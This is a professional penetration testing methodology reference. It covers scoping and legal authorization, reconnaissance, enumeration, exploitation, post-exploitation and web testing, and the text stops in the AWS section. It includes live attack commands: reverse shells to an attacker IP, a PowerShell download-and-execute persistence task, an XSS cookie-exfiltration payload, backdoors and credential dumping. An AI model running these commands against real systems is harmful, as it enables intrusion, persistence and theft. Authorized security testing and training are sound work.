# Penetration Testing Methodology Reference

> **Classification:** Internal Use -- Authorized Security Personnel Only
> **Standard:** PTES, OWASP Testing Guide v4.2, NIST SP 800-115, MITRE ATT&CK v14
> **Last Updated:** 2026-04-26

---

## Table of Contents

1. [Engagement Scoping and Legal Framework](#1-engagement-scoping-and-legal-framework)
2. [Reconnaissance](#2-reconnaissance)
3. [Scanning and Enumeration](#3-scanning-and-enumeration)
4. [Exploitation Methodology](#4-exploitation-methodology)
5. [Post-Exploitation](#5-post-exploitation)
6. [Web Application Testing](#6-web-application-testing)
7. [Cloud Security Testing](#7-cloud-security-testing)
8. [Professional Reporting](#8-professional-reporting)
9. [Tools Reference](#9-tools-reference)
10. [MITRE ATT&CK Mapping](#10-mitre-attck-mapping)

---

## 1. Engagement Scoping and Legal Framework

### 1.1 Rules of Engagement (RoE) Template

A Rules of Engagement document is the foundational legal agreement for any penetration test. Every field must be completed and signed before testing begins.

```text
RULES OF ENGAGEMENT -- Penetration Test Authorization

=================================================================
ENGAGEMENT IDENTIFICATION
=================================================================
Project Name:            ___________________________________
Engagement Reference:    ___________________________________
Version:                 1.0
Classification:          CONFIDENTIAL

=================================================================
PARTIES
=================================================================
Client Organization:     ___________________________________
Client POC (Legal):      ___________________________________
Client POC (Technical):  ___________________________________
Client Emergency Phone:  ___________________________________
Testing Firm:            ___________________________________
Lead Tester:             ___________________________________
Tester Email:            ___________________________________
Tester Phone:            ___________________________________

=================================================================
ENGAGEMENT DATES
=================================================================
Authorized Start:        ___________________________________
Authorized End:          ___________________________________
Testing Hours:           ___________________________________  (e.g. 08:00-18:00)
Blackout Dates:          ___________________________________

=================================================================
SCOPE -- IN-SCOPE ASSETS
=================================================================
IP Ranges / CIDRs:       ___________________________________
Hostnames / Domains:     ___________________________________
Web Applications:        ___________________________________
Cloud Accounts:          ___________________________________
Physical Locations:      ___________________________________

=================================================================
SCOPE -- OUT-OF-SCOPE ASSETS
=================================================================
Excluded IPs:            ___________________________________
Excluded Domains:        ___________________________________
Third-Party Services:    ___________________________________
Shared Infrastructure:   ___________________________________

=================================================================
PERMITTED TESTING TYPES
=================================================================
[ ] External Network Penetration Test
[ ] Internal Network Penetration Test
[ ] Web Application Assessment
[ ] Mobile Application Assessment
[ ] Social Engineering (specify: _______________)
[ ] Physical Security Assessment
[ ] Wireless Assessment
[ ] Red Team Exercise
[ ] Cloud Configuration Review

=================================================================
PROHIBITED ACTIONS
=================================================================
[ ] Denial of Service or disruption of services
[ ] Exfiltration of real PII or sensitive production data
[ ] Destruction or modification of production data
[ ] Lateral movement outside defined scope
[ ] Actions against out-of-scope assets
[ ] Public disclosure without written consent

=================================================================
AUTHORIZATION SIGNATURES
=================================================================
Client (Name / Title):   ___________________________________
Client (Signature):      ___________________________________
Date:                    ___________________________________
Tester (Name):           ___________________________________
Tester (Signature):      ___________________________________
Date:                    ___________________________________
```

### 1.2 Authorization Letter Requirements

The authorization letter must be carried during all testing:

- **Client letterhead** with company name and address
- **Explicit statement** naming the authorized testers and their employer
- **Specific IP ranges, domains, and systems** in scope
- **Date range** of the authorized engagement
- **Emergency contact** with 24/7 mobile availability
- **Wet signature** of authorized executive (CISO, CTO, CEO, or legal counsel)
- **Tester identification** (full name, employer, contact information)

### 1.3 Relevant Legal Frameworks

#### United States -- Computer Fraud and Abuse Act (CFAA), 18 U.S.C. 1030

- Prohibits unauthorized access to protected computers
- Authorization must be explicit and documented -- implied authorization is not a defense
- Penalties: up to 10 years imprisonment per violation; civil liability available to victims

#### United Kingdom -- Computer Misuse Act 1990 (as amended)

- Section 1: Unauthorized access to computer material
- Section 2: Unauthorized access with intent to commit further offences
- Section 3: Unauthorized acts with intent to impair computer operation
- Section 3ZA (Serious Crime Act 2015): Unauthorized acts causing serious damage
- Penalties range from 12 months to life imprisonment depending on section

#### European Union -- Directive 2013/40/EU

- Requires member states to criminalize unauthorized access and data interference
- Implemented via national law: UK CMA, German StGB 202a-c, French LCEN

#### Australia -- Criminal Code Act 1995, Part 10.7

- Division 477: Serious computer offences -- up to 10 years imprisonment
- Division 478: Other computer offences

#### Canada -- Criminal Code, Sections 342.1 and 430

- Section 342.1: Unauthorized use of computer
- Section 430(1.1): Mischief in relation to computer data

### 1.4 NDA and Data Handling Requirements

**Data Classification**
- All findings classified at the client highest data sensitivity tier
- Screenshots, logs, packet captures, and credentials treated as confidential
- No client data stored on personal devices or unencrypted media

**Data Retention Policy**
- Raw findings retained only for duration needed to produce the report
- Standard retention: 30-90 days post-report delivery
- Secure deletion required after retention period (DoD 5220.22-M or cryptographic erasure)
- Written deletion confirmation available on client request

**Transmission Security**
- Reports transmitted via PGP-encrypted email or agreed secure file sharing only
- No findings discussed via unencrypted email, SMS, or public voice channels

### 1.5 Emergency Procedures and Kill Switch

**Kill Switch Conditions -- Testing stops immediately upon:**

1. Production systems becoming unresponsive, degraded, or reporting anomalies
2. Inadvertent access to or exfiltration of real user or customer data
3. Detection of testing by unexpected third parties (law enforcement, other vendors)
4. Client requesting immediate halt via any communication channel
5. Discovery that an active unauthorized breach is underway in the environment

**Emergency Contact Chain**

1. Call client technical POC immediately -- do not send email
2. Record exact timestamp, systems affected, and nature of the incident
3. Preserve all logs and evidence without modification
4. Do not attempt remediation unless explicitly directed by the client
5. Escalate to client management and legal if POC unreachable within 15 minutes

**Communication Protocol**

- Pre-agreed passphrase to halt all testing activity immediately
- Out-of-band communication channel (separate from all tested infrastructure)
- Response SLA: acknowledge within 15 minutes, full halt within 30 minutes

---

## 2. Reconnaissance

### 2.1 Passive OSINT Techniques

Passive reconnaissance gathers information without directly contacting target systems.

#### DNS and Subdomain Enumeration

```bash
# Amass passive enumeration
amass enum -passive -d target.com -o amass_passive.txt

# Subfinder with all sources
subfinder -d target.com -all -recursive -o subfinder.txt

# DNSx to resolve discovered subdomains
cat subfinder.txt | dnsx -resp -a -aaaa -cname -mx -ns -soa -o dnsx_results.txt

# Certificate transparency via crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" \
  | jq -r '.[].name_value' | sort -u | tee crt_sh.txt

# Passive DNS via SecurityTrails API
curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
  -H "APIKEY: YOUR_KEY" | jq -r '.subdomains[]' | sed 's/$/.target.com/'
```

#### Shodan and Censys Queries

```bash
# Shodan CLI searches
shodan search "org:\"Target Corp\"" --fields ip_str,port,org,product
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port,ssl
shodan search "http.title:\"Target\" country:US" --fields ip_str,port,http.title
shodan search "hostname:target.com" --fields ip_str,port,hostnames

# Shodan host details
shodan host 203.0.113.10

# Censys CLI searches
censys search "parsed.names: target.com" --index certificates
censys search "autonomous_system.name: \"Target Corp\"" --index ipv4

# Censys host detail
censys view 203.0.113.10 --index ipv4
```

#### Google Dorks

```text
site:target.com filetype:pdf
site:target.com filetype:xls OR filetype:xlsx OR filetype:csv
site:target.com inurl:admin OR inurl:login OR inurl:portal
site:target.com intitle:"index of" OR intitle:"directory listing"
site:target.com ext:conf OR ext:config OR ext:cfg OR ext:ini
site:target.com ext:bak OR ext:old OR ext:backup OR ext:sql
site:target.com "password" OR "passwd" OR "credentials"
site:target.com inurl:.git OR inurl:.svn OR inurl:.env
"@target.com" filetype:pdf
site:pastebin.com "target.com"
site:github.com "target.com" password OR secret OR token OR key
site:trello.com "target.com"
```

#### Email and Employee Harvesting

```bash
# theHarvester multi-source
theHarvester -d target.com -b all -l 500 -f harvest_output

# Hunter.io API
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY"

# LinkedIn reconnaissance via linkedint
python3 linkedint.py -u username -p password --company "Target Corp" -e
```

#### WHOIS and IP Intelligence

```bash
# Domain WHOIS
whois target.com | tee whois_domain.txt

# IP WHOIS and BGP
whois 203.0.113.0/24
curl -s "https://api.bgpview.io/ip/203.0.113.10" | jq .

# ASN lookup
curl -s "https://api.bgpview.io/asn/AS12345/prefixes" | jq '.data.ipv4_prefixes[].prefix'

# Reverse WHOIS (find domains registered by same email)
curl -s "https://viewdns.info/reversewhois/?q=admin%40target.com&apikey=KEY"
```

### 2.2 Active Reconnaissance

Active recon directly touches target systems. Confirm written authorization before proceeding.

#### Nmap Scanning Profiles

```bash
# Phase 1: Host discovery (stealth)
nmap -sn -PE -PP -PS21,22,23,25,80,443,8080 \
  --source-port 53 -oA host_discovery 192.168.1.0/24

# Phase 2: Port scan (full TCP)
nmap -sS -sV --version-intensity 5 -O \
  -p- --min-rate 1000 --max-retries 2 \
  -oA full_tcp_scan 192.168.1.10

# Phase 3: UDP scan (top 200 ports)
nmap -sU --top-ports 200 -sV \
  --version-intensity 3 \
  -oA udp_scan 192.168.1.10

# Phase 4: Script scan on open ports
nmap -sC -sV -p 22,80,443,8080,8443 \
  --script=vuln,auth,default \
  -oA script_scan 192.168.1.10

# Specific service scripts
nmap -p 80,443,8080,8443 --script=http-title,http-headers,http-methods \
  --script-args http-methods.retest=true 192.168.1.10

# IPv6 scan
nmap -6 -sV -p 22,80,443 2001:db8::/32
```

#### DNS Enumeration

```bash
# Zone transfer attempt
dig axfr @ns1.target.com target.com
host -t axfr target.com ns1.target.com

# DNSSEC check
dig +dnssec DNSKEY target.com
dig +dnssec A www.target.com

# Brute-force subdomains
gobuster dns -d target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt \
  -r 8.8.8.8 -t 50 -o gobuster_dns.txt

# Fierce for zone walking
fierce --domain target.com --subdomains /usr/share/wordlists/fierce/directory-list-2.3-medium.txt

# Dnsrecon
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
dnsrecon -d target.com -t axfr
```

### 2.3 Threat Intelligence Integration

```bash
# Check IP reputation (VirusTotal)
curl -s "https://www.virustotal.com/api/v3/ip_addresses/203.0.113.10" \
  -H "x-apikey: YOUR_KEY" | jq '.data.attributes.last_analysis_stats'

# AlienVault OTX indicators
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/general" \
  -H "X-OTX-API-KEY: YOUR_KEY"

# Shodan CVE exposure
shodan search "org:\"Target Corp\"" --fields ip_str,port,vulns \
  | grep -i CVE | sort | uniq -c | sort -rn
```

---

## 3. Scanning and Enumeration

### 3.1 Vulnerability Scanning

#### Nuclei

```bash
# Full target scan with all templates
nuclei -u https://target.com \
  -t ~/nuclei-templates/ \
  -severity critical,high,medium \
  -rate-limit 50 \
  -bulk-size 25 \
  -o nuclei_output.txt \
  -json

# Specific template categories
nuclei -u https://target.com -t cves/ -t exposures/ -t misconfiguration/
nuclei -l targets.txt -t ~/nuclei-templates/ -c 20 -rl 100

# Technology fingerprint only
nuclei -u https://target.com -t technologies/ -o tech_fingerprint.txt
```

#### Web Technology Fingerprinting

```bash
# whatweb
whatweb -v -a 3 https://target.com | tee whatweb_output.txt
whatweb -v -a 4 --color=never -l targets.txt --log-json=whatweb.json

# wappalyzer CLI
wappalyzer https://target.com --output=json

# wafw00f -- WAF detection
wafw00f https://target.com -a

# httprobe -- filter live hosts
cat domains.txt | httprobe -s -p https:8443 | tee live_hosts.txt
```

#### OpenVAS / Greenbone

```bash
# Initialize and start OpenVAS
gvm-setup
gvm-start
gvm-check-setup

# CLI via gvm-cli
gvm-cli socket --gmp-username admin --gmp-password PASSWORD \
  --xml "<get_version/>"
```

### 3.2 SMB Enumeration

```bash
# enum4linux-ng (modern replacement for enum4linux)
enum4linux-ng -A -C 192.168.1.10 | tee smb_enum.txt

# Detailed enum4linux-ng
enum4linux-ng -A -u "" -p "" 192.168.1.10
enum4linux-ng -A -u "guest" -p "" 192.168.1.10
enum4linux-ng -A -u "administrator" -p "Password123" 192.168.1.10

# Manual SMB enumeration with smbclient
smbclient -L \\\\192.168.1.10 -N
smbclient \\\\192.168.1.10\\share -N
smbclient -U "user%password" \\\\192.168.1.10\\share

# CrackMapExec (CME) enumeration
crackmapexec smb 192.168.1.0/24
crackmapexec smb 192.168.1.10 -u "" -p "" --shares
crackmapexec smb 192.168.1.10 -u "user" -p "pass" --users --groups --shares
crackmapexec smb 192.168.1.10 -u "user" -p "pass" --sam
crackmapexec smb 192.168.1.10 -u "user" -p "pass" --lsa

# impacket SMB tools
python3 /usr/share/doc/python3-impacket/examples/smbmap.py \
  -H 192.168.1.10 -u "" -p ""
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py \
  "DOMAIN/user:password"@192.168.1.10
```

### 3.3 SNMP Enumeration

```bash
# Community string brute-force
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt 192.168.1.10

# SNMPwalk with found community
snmpwalk -v 2c -c public 192.168.1.10 .1.3.6.1
snmpwalk -v 2c -c public 192.168.1.10 system
snmpwalk -v 2c -c public 192.168.1.10 ifDescr
snmpwalk -v 2c -c public 192.168.1.10 hrSWInstalledName

# SNMPbulkwalk for efficiency
snmpbulkwalk -v 2c -c public 192.168.1.10 .1 | tee snmp_full.txt

# Nmap SNMP scripts
nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-processes,\
snmp-win32-software,snmp-win32-users 192.168.1.10
```

### 3.4 LDAP Enumeration

```bash
# Anonymous LDAP bind
ldapsearch -x -h 192.168.1.10 -b "dc=target,dc=com" -s base

# Enumerate domain users
ldapsearch -x -h 192.168.1.10 -b "dc=target,dc=com" \
  -D "cn=user,dc=target,dc=com" -w "password" \
  "(objectClass=user)" sAMAccountName userPrincipalName

# Enumerate groups
ldapsearch -x -h 192.168.1.10 -b "dc=target,dc=com" \
  -D "cn=user,dc=target,dc=com" -w "password" \
  "(objectClass=group)" cn member

# Domain admins
ldapsearch -x -h 192.168.1.10 -b "dc=target,dc=com" \
  -D "cn=user,dc=target,dc=com" -w "password" \
  "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))"

# ldapdomaindump
ldapdomaindump -u "DOMAIN\\user" -p "password" 192.168.1.10 -o ldap_dump/

# BloodHound collection (BloodHound.py)
python3 bloodhound.py -u user -p password -d target.com \
  -dc 192.168.1.10 -c All --zip
```

### 3.5 Service-Specific Enumeration

```bash
# FTP
nmap -sV -p 21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor 192.168.1.10

# SSH
nmap -sV -p 22 --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos 192.168.1.10
ssh-audit 192.168.1.10

# RDP
nmap -sV -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 192.168.1.10
crackmapexec rdp 192.168.1.0/24

# MSSQL
nmap -sV -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-ntlm-info 192.168.1.10
python3 /opt/impacket/examples/mssqlclient.py "DOMAIN/user:password@192.168.1.10"

# MySQL
nmap -sV -p 3306 --script=mysql-info,mysql-enum,mysql-databases 192.168.1.10
mysql -h 192.168.1.10 -u root -p

# NFS
showmount -e 192.168.1.10
nmap -sV -p 111,2049 --script=nfs-showmount,nfs-ls,nfs-statfs 192.168.1.10
```

---

## 4. Exploitation Methodology

### 4.1 PTES Seven-Phase Methodology

The Penetration Testing Execution Standard defines seven phases:

| Phase | Name | Key Activities |
|-------|------|----------------|
| 1 | Pre-Engagement Interactions | Scoping, RoE, legal authorization |
| 2 | Intelligence Gathering | OSINT, passive recon, footprinting |
| 3 | Threat Modeling | Asset identification, threat actor profiling |
| 4 | Vulnerability Analysis | Scanning, manual review, vuln validation |
| 5 | Exploitation | CVE exploitation, logic flaws, credential attacks |
| 6 | Post-Exploitation | Persistence, privilege escalation, lateral movement |
| 7 | Reporting | Executive summary, technical findings, remediation |

### 4.2 CVE Research Workflow

```bash
# Search NVD for CVEs
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache+Log4j&cvssV3Severity=CRITICAL" \
  | jq '.vulnerabilities[].cve | {id: .id, description: .descriptions[0].value, score: .metrics.cvssMetricV31[0].cvssData.baseScore}'

# Check EPSS score for prioritization
curl -s "https://api.first.org/data/v1/epss?cve=CVE-2021-44228" \
  | jq '.data[] | {cve: .cve, epss: .epss, percentile: .percentile}'

# Check CISA KEV catalog
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" \
  | jq '.vulnerabilities[] | select(.cveID == "CVE-2021-44228")'

# Searchsploit for local exploit database
searchsploit "apache log4j"
searchsploit -m 50592  # copy exploit to current directory
searchsploit -x 50592  # examine without copying

# GitHub search for PoC
gh search repos "CVE-2021-44228" --sort=stars --limit=10
```

### 4.3 Metasploit Framework Usage

```bash
# Start Metasploit
msfconsole -q

# Database setup
msfdb init
msfdb start
```

```ruby
# Core workflow
workspace -a engagement_name
db_nmap -sV -p 1-65535 192.168.1.0/24
hosts
services
vulns

# Search and use module
search type:exploit platform:windows cve:2017-0144
use exploit/windows/smb/ms17_010_eternalblue
info
show options
set RHOSTS 192.168.1.10
set LHOST 10.10.14.1
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
run

# Meterpreter post-exploitation
getuid
getpid
sysinfo
getsystem
hashdump
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run post/windows/manage/enable_rdp
background
sessions -l
sessions -i 1
```

### 4.4 Password Testing and Credential Attacks

```bash
# Hydra online brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
hydra -L users.txt -P passwords.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# Hashcat offline cracking
# MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# NTLM
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
# bcrypt
hashcat -m 3200 -a 0 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt
# SHA-256
hashcat -m 1400 -a 0 sha256_hashes.txt /usr/share/wordlists/rockyou.txt
# Rule-based attack
hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt wordlist.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# CrackMapExec password spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password123" --continue-on-success
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password123!" --no-bruteforce

# Kerbrute AS-REP roasting candidates
kerbrute userenum --dc 192.168.1.10 -d target.com users.txt

# impacket Kerberoasting
python3 /opt/impacket/examples/GetUserSPNs.py \
  "target.com/user:password" -dc-ip 192.168.1.10 -request \
  -outputfile kerberoast_hashes.txt
```

### 4.5 Web Exploitation Techniques

```bash
# SQL injection with SQLMap
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" \
  --method=POST --batch --dbs

# Directory brute-force
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt,bak,old \
  -t 50 -o gobuster_dir.txt

# ffuf -- faster fuzzing
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt \
  -mc 200,201,301,302,403 \
  -t 100 -o ffuf_output.json -of json
```

---

## 5. Post-Exploitation

### 5.1 Linux Privilege Escalation

```bash
# System enumeration
id && whoami
uname -a && cat /etc/os-release
cat /etc/passwd | grep -v nologin
sudo -l

# Automated tools
./linpeas.sh | tee linpeas_output.txt
./linux-exploit-suggester.sh

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null

# Writable directories and files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Capabilities
getcap -r / 2>/dev/null

# NFS misconfiguration (no_root_squash)
cat /etc/exports
showmount -e localhost

# Docker escape
docker ps -a
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# GTFObins-based escalation examples
# sudo find
sudo find . -exec /bin/sh \; -quit
# sudo vim
sudo vim -c ':!/bin/sh'
# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'
# SUID bash
/bin/bash -p
```

### 5.2 Windows Privilege Escalation

```cmd
:: System information
whoami /all
net user
net localgroup administrators
systeminfo
wmic qfe list brief /format:table

:: Automated tools -- run winpeas and PowerUp
:: .\winpeas.exe > winpeas_output.txt

:: Unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto"
sc qc "service_name"

:: Weak service permissions
sc config "VulnService" binpath= "C:\Users\user\nc.exe -e cmd.exe 10.10.14.1 4444"
sc start "VulnService"

:: AlwaysInstallElevated registry check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell enumeration
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}
Get-LocalGroupMember -Group "Administrators"
```

### 5.3 Lateral Movement Techniques

```bash
# Pass-the-Hash (PTH) with impacket
python3 /opt/impacket/examples/psexec.py -hashes "LM:NT" \
  "DOMAIN/Administrator@192.168.1.10"

python3 /opt/impacket/examples/wmiexec.py -hashes "LM:NT" \
  "DOMAIN/Administrator@192.168.1.10"

python3 /opt/impacket/examples/smbexec.py -hashes "LM:NT" \
  "DOMAIN/Administrator@192.168.1.10"

# Pass-the-Ticket (PTT)
python3 /opt/impacket/examples/getTGT.py \
  "target.com/user:password" -dc-ip 192.168.1.10
export KRB5CCNAME=user.ccache
python3 /opt/impacket/examples/psexec.py -k -no-pass \
  "DOMAIN/user@192.168.1.20"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123'
evil-winrm -i 192.168.1.10 -u Administrator -H "NT_HASH"

# SSH tunneling and pivoting
# Local port forward
ssh -L 8080:internal.target.com:80 user@jumphost.target.com
# Dynamic SOCKS proxy
ssh -D 1080 user@jumphost.target.com

# Chisel tunneling
# On attacker: ./chisel server -p 8000 --reverse
# On target: ./chisel client 10.10.14.1:8000 R:socks
proxychains nmap -sT 192.168.2.0/24

# Credential dumping
python3 /opt/impacket/examples/secretsdump.py \
  "DOMAIN/Administrator:Password123"@192.168.1.10
python3 /opt/impacket/examples/secretsdump.py \
  -system SYSTEM -sam SAM LOCAL
```

### 5.4 Persistence Mechanisms

```bash
# Linux persistence
# Cron job
(crontab -l; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/10.10.14.1/4444 0>&1") | crontab -
# SSH authorized_keys
echo "ssh-rsa AAAA...attackerkey" >> ~/.ssh/authorized_keys
# SUID backdoor
cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash
```

```cmd
:: Windows persistence
:: Registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe" /f
:: Scheduled task
schtasks /create /sc minute /mo 5 /tn "SystemUpdate" /tr "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1'))" /ru SYSTEM
:: Services
sc create "WinDefender" binpath= "C:\backdoor.exe" start= auto
```

---

## 6. Web Application Testing

### 6.1 OWASP Testing Guide v4.2 Framework

The OWASP OTG v4.2 defines 91 test cases across 12 categories:

| Category | Code | Key Tests |
|----------|------|-----------|
| Information Gathering | OTG-INFO | Fingerprint web server, enumerate application entry points |
| Configuration Management | OTG-CONFIG | Network/app config, file extension handling, HTTP methods |
| Identity Management | OTG-IDENT | Role definitions, account enumeration, password policy |
| Authentication | OTG-AUTHN | Credentials over HTTPS, default credentials, lockout |
| Authorization | OTG-AUTHZ | Path traversal, privilege escalation, IDOR |
| Session Management | OTG-SESS | Cookie attributes, CSRF, session fixation |
| Input Validation | OTG-INPVAL | XSS, SQLi, command injection, LFI/RFI |
| Error Handling | OTG-ERR | Error codes, stack traces, sensitive data in errors |
| Cryptography | OTG-CRYPST | TLS version, cipher suites, certificate validation |
| Business Logic | OTG-BUSLOGIC | Workflow bypass, negative amounts, race conditions |
| Client-Side | OTG-CLIENT | DOM-based XSS, clickjacking, HTML injection |
| API Testing | OTG-API | Authentication, input validation, rate limiting |

### 6.2 Authentication Testing

```bash
# Default credential testing
hydra -L /usr/share/wordlists/metasploit/http_default_userpass.txt \
  -P /usr/share/wordlists/metasploit/http_default_pass.txt \
  192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:error"

# JWT testing -- decode
echo "eyJ..." | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# JWT tool attacks
python3 jwt_tool.py eyJ... -X a    # algorithm confusion
python3 jwt_tool.py eyJ... -T      # tamper mode
python3 jwt_tool.py eyJ... -C -d wordlist.txt  # crack secret

# OAuth testing checklist:
# - Test state parameter absence (CSRF protection)
# - Test redirect_uri manipulation
# - Test scope escalation
# - Test token leakage in Referer header
```

### 6.3 Injection Testing

```bash
# SQL injection manual tests
# Boolean-based
' AND 1=1-- -
' AND 1=2-- -
' OR 1=1-- -

# Time-based blind
' AND SLEEP(5)-- -
' AND pg_sleep(5)-- -
'; WAITFOR DELAY '0:0:5'--

# Union-based (determine column count)
' ORDER BY 1-- -
' ORDER BY 2-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -

# SQLMap automated
sqlmap -u "https://target.com/?id=1" \
  --technique=BEUTSQ \
  --level=5 --risk=3 \
  --batch --dbs

# NoSQL injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}

# Command injection
; id
& id
| id
$(id)
; ping -c 1 10.10.14.1
; curl http://10.10.14.1/$(whoami)

# LDAP injection
*)(uid=*))(|(uid=*
admin)(|(password=*

# XXE injection
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 6.4 XSS Testing

XSS occurs when untrusted data is rendered in a browser without proper encoding. The three types are reflected, stored, and DOM-based.

```text
Test payloads for reflected and stored XSS:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"onmouseover="alert(1)
<ScRiPt>alert(1)</sCrIpT>

DOM XSS sinks to test:
- innerHTML assignment
- setTimeout with a string argument (executes the string as code)
- window.location manipulation
- document.URL parsing without sanitization

Cookie exfiltration via stored XSS:
<script>new Image().src='http://10.10.14.1/collect?c='+encodeURIComponent(document.cookie);</script>

XSS filter bypass techniques:
<script>alert`1`</script>
<svg/onload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```

### 6.5 IDOR and Broken Access Control

```bash
# Manual IDOR tests -- horizontal privilege escalation
# Replace own ID with another user's ID in API calls
curl -b "session=VICTIM_COOKIE" \
  "https://target.com/api/v1/users/ATTACKER_ID/profile"

# Vertical privilege escalation test
# Use non-admin token to access admin endpoints
curl -H "Authorization: Bearer USER_TOKEN" \
  "https://target.com/api/v1/admin/users"

# Mass assignment test
curl -X PUT "https://target.com/api/v1/users/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"User","email":"user@test.com","role":"admin","isAdmin":true}'

# Path traversal
curl "https://target.com/download?file=../../etc/passwd"
curl "https://target.com/download?file=..%2F..%2Fetc%2Fpasswd"
curl "https://target.com/download?file=....//....//etc/passwd"
```

### 6.6 SSRF Testing

```bash
# Basic SSRF
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/fetch?url=http://127.0.0.1:22"
curl "https://target.com/fetch?url=http://127.0.0.1:6379"  # Redis
curl "https://target.com/fetch?url=http://127.0.0.1:8500"  # Consul

# Cloud metadata endpoints
# AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP: http://metadata.google.internal/computeMetadata/v1/instance/
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

# SSRF bypass techniques
http://0177.0.0.1/         # Octal
http://2130706433/         # Decimal
http://0x7f.0.0.1/         # Hex
http://[::1]/              # IPv6
http://localhost/
http://lvh.me/             # DNS resolves to 127.0.0.1

# Blind SSRF with out-of-band (use interactsh)
interactsh-client
curl "https://target.com/webhook?url=http://INTERACTSH_URL"
```

### 6.7 API Security Testing

```bash
# API documentation discovery
curl "https://target.com/swagger.json"
curl "https://target.com/openapi.json"
curl "https://target.com/api-docs"
gobuster dir -u https://target.com/api/v1/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api-endpoints.txt

# REST API authentication bypass
curl "https://target.com/api/v1/admin/users"
curl "https://target.com/api/v1/admin/users.json"

# HTTP method override
curl -X POST "https://target.com/api/v1/users/1" \
  -H "X-HTTP-Method-Override: DELETE"

# GraphQL introspection
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Rate limiting test
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://target.com/api/v1/login" \
    -d '{"user":"test","pass":"test"}' &
done
wait
```

---

## 7. Cloud Security Testing

### 7.1 AWS Security Assessment

```bash
# AWS credential enumeration
cat ~/.aws/credentials
env | grep AWS
find / -name "*.aws" -o -name "credentials" 2>/dev/null | grep aws

# AWS CLI enumeration
aws sts get-caller-identity
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-groups
aws iam list-policies --scope Local

